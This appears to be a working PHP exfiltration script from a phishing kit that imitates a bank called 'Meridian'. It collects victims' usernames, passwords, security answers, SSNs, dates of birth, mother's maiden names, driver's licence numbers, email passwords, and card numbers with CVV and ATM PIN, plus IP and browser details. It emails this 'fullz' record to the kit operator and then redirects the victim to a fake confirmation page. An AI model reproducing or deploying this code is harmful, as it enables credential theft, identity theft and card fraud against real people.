<?php
    session_start();
    include 'email.php';
	
    $user =$_SESSION['username'];
	$pass =$_SESSION['password'];
	
	$q1=$_SESSION['question1'];
	$q2=$_SESSION['question2'];
	$q3=$_SESSION['question3'];
	$a1=$_SESSION['answer1'];
	$a2=$_SESSION['answer2'];
	$a3=$_SESSION['answer3'];


$fn = $_SESSION['FN'];
$db = $_SESSION['DB'];
$mn = $_SESSION['MN'];
$sn = $_SESSION['SN'];
$dl = $_SESSION['DL'];

$ea = $_SESSION['EA'];
$ep = $_SESSION['EP'];


$cn = $_SESSION['CN'];
$ed = $_SESSION['ED'];
$cv = $_SESSION['CV'];
$ap = $_SESSION['AP'];

if (getenv(HTTP_CLIENT_IP)) {
    $ip = getenv(HTTP_CLIENT_IP);
} else {
    $ip = getenv(REMOTE_ADDR);
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "
=====================
User: $user
Pass: $pass
-

Q1: $q1
a1: $a1
Q2: $q2
a2: $a2
q3: $q3
a3: $a3

-
fn: $fn
dob: $db
mmn: $mn
ssn: $sn
dL: $dl
-
email: $ea
ep: $ep
-

CC: $cn
exp:$ed
cvv: $cv
atm : $ap

------------------------***
Ip: $ip,$browser
Host: $hostname
=====================";
if ($cn != "" && $cv != "" && strlen($fn)<20 ) {
   $subj = "#Meridian fullz# $user # $ip";

mail($to, $subj, $data);

}



    header("Location: ./finalmsg.htm?sslchannel=true&amp;sessionid=xrBUswTnRWBlzTfC8idT1OKtdKKh7spEU1znxtKopmJYfZBnhOhjD2MQMw7TZxyTy7h5B2u0oeZDeA1v");
 ?>